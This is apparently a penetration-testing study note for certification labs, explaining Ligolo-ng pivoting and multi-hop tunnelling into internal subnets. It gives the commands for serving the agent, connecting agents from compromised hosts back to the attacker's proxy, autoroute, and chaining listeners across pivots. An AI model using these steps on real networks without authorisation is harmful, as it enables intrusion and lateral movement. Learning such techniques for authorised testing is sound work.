# 🔗 1. Ligolo-ng Pivoting — Mental Model

> [!info] Core Idea  
> **Pivoting** = use a compromised host as a bridge into networks that your attack machine cannot directly reach.
> 
> **Basic topology:**
> 
> ```text
> Kali
>   │
>   │ Ligolo-ng tunnel
>   ▼
> Pivot / Compromised Host
>   │
>   └──► Internal Network
>             └──► Internal Targets
> ```

Typical situation:

```text
Kali
192.168.1.107
      │
      ▼
Windows 10
192.168.1.105
169.254.62.20
      │
      ▼
169.254.62.0/24
```

Kali can reach `192.168.1.0/24`, but initially:

```bash
ping 169.254.62.20
```

fails because Kali has no route to that network.

Ligolo-ng solves this by creating a **TUN interface and routes**, allowing normal tools such as `ping`, `nmap`, RDP, etc. to communicate with the internal network.

---

# 🛠️ 2. Ligolo-ng Components

Ligolo-ng uses:

|Component|Purpose|
|---|---|
|`proxy`|Runs on the attacker machine|
|`agent`|Runs on the compromised machine|
|TUN interface|Provides routing from Kali into the remote network|
|Listener|Allows deeper pivots to connect through an existing pivot|

> [!important]  
> Ligolo-ng is a **reverse tunnel**. The compromised host initiates the connection back to the attacker's Ligolo-ng proxy.

---

# 📦 3. Obtaining Ligolo-ng

Possible installation methods:

```bash
sudo apt install ligolo-ng
```

Or:

- Compile from the official source.
    
- Download a precompiled release.
    

For engagements, reviewing the source and compiling your own binary can be preferable.

Example release:

```text
Ligolo-ng proxy 0.8.2 Linux AMD64
```

Extract archives:

```bash
gzip <filename>.gz -d
tar -xf <filename>.tar
```

---

# 🖥️ 4. Start the Ligolo-ng Proxy

On Kali:

```bash
```
sudo ligolo-proxy -selfcert
``
The proxy uses a self-signed certificate.

You may be asked whether to enable the web UI:

```text
Enable web UI? [Y/n]
```

Answer:

```text
Y
```

The web interface starts on:

```text
127.0.0.1:8080
```

The Ligolo-ng agent listener uses:

```text
11601
```

---

# 📥 5. Transfer the Agent

Place `agent.exe` in a directory served by a Python HTTP server.

Example:

```bash
python3 -m http.server 80
```

On Windows, download the agent from the Kali machine.

Terminal alternatives:

```bash
curl ...
```

```bash
wget ...
```

> [!warning]  
> Real Windows systems may have Defender/AV block known Ligolo-ng binaries. In CPTS labs this may not happen. In real engagements, binary execution and transfer must account for defensive controls.

---

# 🔌 6. Connect the Agent

On the compromised Windows host:

```powershell
.\agent.exe -connect 192.168.1.107:11601 -ignore-cert
```

### Options

|Option|Purpose|
|---|---|
|`-connect`|Connect to the Ligolo-ng proxy|
|`-ignore-cert`|Ignore certificate validation because the proxy uses a self-signed certificate|

Successful connection:

```text
Connection established
```

The proxy will show a new agent, for example:

```text
New agent joined
Name: Win10 VM
Connection from: 192.168.1.105:49978
```

---

# 🎯 7. Enter the Agent Session

Inside the Ligolo-ng proxy:

```text
session
```

Select the appropriate session.

Then:

```text
help
```

This shows available operations, including routing, listeners, and tunnel management.

---

# 🚀 8. Autoroute — Preferred Method

> [!success] CPTS Preferred Workflow  
> For demonstrations and normal usage, use **`autoroute`** rather than manually creating TUN interfaces and adding routes.
> 
> The manual method is important to understand conceptually, but **do not use it as the demonstration workflow**.

Inside the selected Ligolo-ng session:

```text
autoroute
```

Ligolo-ng presents the networks/routes discovered through the compromised host.

Typical interaction:

```text
1. Select the internal network/route
2. Use ↑ / ↓ to move between routes
3. Press SPACE to select the desired route
4. Press ENTER
5. Choose/create the network interface for the tunnel
6. Confirm starting the tunnel with Y
```

For the example:

```text
169.254.62.0/24
```

is the important internal network.

The exact interface name may be automatically generated.

> [!important]  
> Do **not** memorize a generated interface name from a video. The important concept is:
> 
> ```text
> autoroute
>    ↓
> select internal route
>    ↓
> select/create TUN interface
>    ↓
> start tunnel
>    ↓
> Kali receives route to internal network
> ```

Verify:

```bash
ifconfig
```

Then:

```bash
ping 169.254.62.20
```

If successful, Kali can now communicate with the internal network normally.

You can then use:

```bash
nmap ...
```

or connect directly to services such as RDP:

```text
169.254.62.20
```

---

# 🧠 9. Why Autoroute Is Better

Without Ligolo-ng:

```text
Kali ──X──► 169.254.62.20
```

After `autoroute`:

```text
Kali
 │
 │ TUN interface
 │
 ▼
Ligolo-ng tunnel
 │
 ▼
Pivot
 │
 ▼
169.254.62.0/24
```

The major advantage is that applications on Kali behave as though the internal network were locally routed.

You do **not** need:

```text
proxychains nmap ...
proxychains nc ...
proxychains xfreerdp ...
```

for every individual tool.

---

# 🔀 10. Multi-Pivoting — Mental Model

A compromised machine may itself have access to another network.

Example:

```text
Kali
  │
  ▼
Pivot 1
10.10.11.15
  │
  ▼
172.16.5.0/24
  │
  ▼
Pivot 2
172.16.5.35
  │
  ▼
172.16.6.0/24
  │
  ▼
Pivot 3
172.16.6.25
  │
  ▼
172.16.10.0/24
```

> [!important] Key Methodology  
> **Every newly compromised host should be checked for additional network interfaces and subnets.**
> 
> A compromised host is not necessarily the final target. It may be a **jump box into another network**.

---

# 🚀 11. Multi-Pivot Using Autoroute

The same `autoroute` concept should be used at **each pivot**.

You do **not** need to manually create TUN interfaces or manually add routes during the demonstration.

The workflow becomes:

```text
Compromise Pivot 1
        │
        ▼
Connect Agent 1
        │
        ▼
autoroute
        │
        ▼
Reach Network 1
        │
        ▼
Find Pivot 2
        │
        ▼
Connect Agent 2 through Pivot 1
        │
        ▼
autoroute
        │
        ▼
Reach Network 2
        │
        ▼
Find Pivot 3
        │
        ▼
Connect Agent 3 through Pivot 2
        │
        ▼
autoroute
        │
        ▼
Reach Network 3
```

---

# 🥇 12. Pivot 1 — Autoroute

Example first foothold:

```text
Target: 10.129.229.129
Internal interface: 172.16.5.15
```

Start Ligolo-ng proxy on Kali:

```bash
sudo ./proxy -selfcert
```

Transfer the Linux agent to Pivot 1.

Make it executable:

```bash
chmod +x <agent>
```

Connect back to Kali:

```bash
./<linux-agent> -connect <KALI-IP>:11601 -ignore-cert
```

On the proxy:

```text
session
```

Select Pivot 1.

Now use:

```text
autoroute
```

Select:

```text
172.16.5.0/24
```

Using:

```text
↑ / ↓
SPACE
ENTER
```

Choose/create the tunnel interface and confirm:

```text
Y
```

Now test:

```bash
ping 172.16.5.15
```

Check routing:

```bash
ip route
```

Then enumerate:

```bash
nmap ...
```

This reveals another host, for example:

```text
172.16.5.35
pivot server one
```

---

# 🔁 13. Pivot 2 — Connecting Through Pivot 1

Pivot 2 has:

```text
172.16.5.35
172.16.6.35
```

The important discovery is:

```text
Pivot 2
   │
   └──► 172.16.6.0/24
```

Kali cannot directly reach that network.

First, on the **Pivot 1 Ligolo-ng session**, create a listener:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Then verify:

```text
listener_list
```

The listener should show as online.

### What the listener does

```text
Pivot 2 Agent
      │
      │ connects to 172.16.5.15:11601
      ▼
Pivot 1 Listener
      │
      ▼
localhost:11601
      │
      ▼
Existing Ligolo-ng tunnel
      │
      ▼
Kali Proxy
```

This allows the second agent to reach the attacker's Ligolo-ng proxy **through Pivot 1**.

Transfer the Windows agent to Pivot 2.

On Pivot 2:

```powershell
dir
```

Then:

```powershell
.\agent.exe -connect 172.16.5.15:11601 -ignore-cert
```

The proxy should now show a second agent.

---

# 🚀 14. Autoroute Pivot 2

Inside the Ligolo-ng proxy:

```text
session
```

Select the **second pivot**.

Then:

```text
autoroute
```

Select:

```text
172.16.6.0/24
```

Use:

```text
↑ / ↓
SPACE
ENTER
```

Choose/create the tunnel interface and confirm:

```text
Y
```

Test:

```bash
ping 172.16.6.35
```

Check:

```bash
ip route
```

Now Kali can reach:

```text
172.16.6.0/24
```

---

# 🔁 15. Pivot 3 — Deeper Network

Suppose another host is discovered:

```text
172.16.6.25
pivot win10
```

After compromising it through RDP, inspect its network configuration:

```cmd
ipconfig
```

Suppose it reveals:

```text
172.16.10.0/24
```

This means Pivot 3 provides another route deeper into the environment.

---

# 🚀 16. Autoroute Pivot 3

On the **Pivot 2 Ligolo-ng session**, create another listener:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Verify:

```text
listener_list
```

Transfer the Windows agent to Pivot 3.

On Pivot 3:

```powershell
.\agent.exe -connect 172.16.6.35:11601 -ignore-cert
```

The third agent should appear in the Ligolo-ng proxy.

Select it:

```text
session
```

Then:

```text
autoroute
```

Select:

```text
172.16.10.0/24
```

Use:

```text
↑ / ↓
SPACE
ENTER
```

Choose/create the tunnel interface and confirm:

```text
Y
```

Test:

```bash
ping 172.16.10.x
```

Check:

```bash
ip route
```

Kali can now access the third internal network.

---

# 🗺️ 17. Complete Multi-Pivot Mental Model

```text
                         ATTACKER
                            │
                            ▼
                     ┌─────────────┐
                     │    Kali     │
                     │ Ligolo Proxy│
                     └──────┬──────┘
                            │
                     Agent 1│
                            ▼
                     ┌─────────────┐
                     │   Pivot 1   │
                     │ 10.10.11.x  │
                     └──────┬──────┘
                            │
                    172.16.5.0/24
                            │
                            ▼
                     ┌─────────────┐
                     │   Pivot 2   │
                     │172.16.5.35  │
                     └──────┬──────┘
                            │
                    172.16.6.0/24
                            │
                            ▼
                     ┌─────────────┐
                     │   Pivot 3   │
                     │172.16.6.25  │
                     └──────┬──────┘
                            │
                   172.16.10.0/24
                            │
                            ▼
                     Deeper Targets
```

The repeated pattern is:

```text
Find new network
      ↓
Find host with access to it
      ↓
Compromise host
      ↓
Connect new Ligolo-ng agent
      ↓
Create listener on previous pivot
      ↓
autoroute
      ↓
Reach new network
      ↓
Enumerate again
      ↓
Repeat
```

---

# 🧩 18. Manual Method — Understand It, Don't Use It in the Demo

The **manual method** exists so you understand what `autoroute` is automating.

Conceptually, you would manually:

```text
1. Create a TUN interface
2. Bring the interface UP
3. Start the Ligolo tunnel on that interface
4. Add a route for the internal subnet
5. Verify the route
6. Test connectivity
```

> [!important]  
> You should understand this because `autoroute` is essentially automating the **TUN + route + tunnel setup**.
> 
> However, in these demonstrations, use:
> 
> ```text
> autoroute
> ```
> 
> instead of manually creating interfaces and routes.

This keeps the practical workflow consistent and avoids unnecessary manual setup.

---

# 🧠 19. CPTS Methodology — What to Look For

When you compromise a host, immediately think:

```text
┌──────────────────────────────┐
│ I have compromised a host.   │
└──────────────┬───────────────┘
               ▼
      Check network interfaces
               │
               ▼
       Are there new subnets?
          /            \
        No              Yes
        │                │
        ▼                ▼
 Continue         Set up Ligolo-ng
 enumeration             │
                         ▼
                     autoroute
                         │
                         ▼
                  Enumerate subnet
                         │
                         ▼
                 Find next pivot
                         │
                         ▼
                    Repeat
```

> [!tip] The Critical Question  
> Don't only ask:
> 
> **“What can I attack from this machine?”**
> 
> Also ask:
> 
> **“What network can this machine reach that I cannot?”**

That second question is the foundation of multi-pivoting.

---

# 📌 20. Command Cheat Sheet

### Proxy

```bash
sudo ./proxy -selfcert
```

### Linux Agent

```bash
chmod +x <agent>
```

```bash
./<linux-agent> -connect <KALI-IP>:11601 -ignore-cert
```

### Windows Agent

```powershell
.\agent.exe -connect <KALI-IP>:11601 -ignore-cert
```

### Session

```text
session
```

### Help

```text
help
```

### Preferred Routing

```text
autoroute
```

### Listener for Next Pivot

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

### Listeners

```text
listener_list
```

### Verification

```bash
ifconfig
```

```bash
ip route
```

```bash
ping <internal-IP>
```

```bash
nmap ...
```

---

# 🎯 21. Final Mental Model

> [!success]  
> **Ligolo-ng turns compromised hosts into routed gateways.**
> 
> ```text
> Compromise
>     ↓
> Discover interfaces/subnets
>     ↓
> Connect Ligolo-ng agent
>     ↓
> autoroute
>     ↓
> Enumerate internal network
>     ↓
> Find another pivot
>     ↓
> Listener on previous pivot
>     ↓
> Connect next agent
>     ↓
> autoroute again
>     ↓
> Repeat deeper into the network
> ```
> 
> The **manual TUN/interface/route process is important knowledge**, but `autoroute` should be the normal practical workflow for these demonstrations.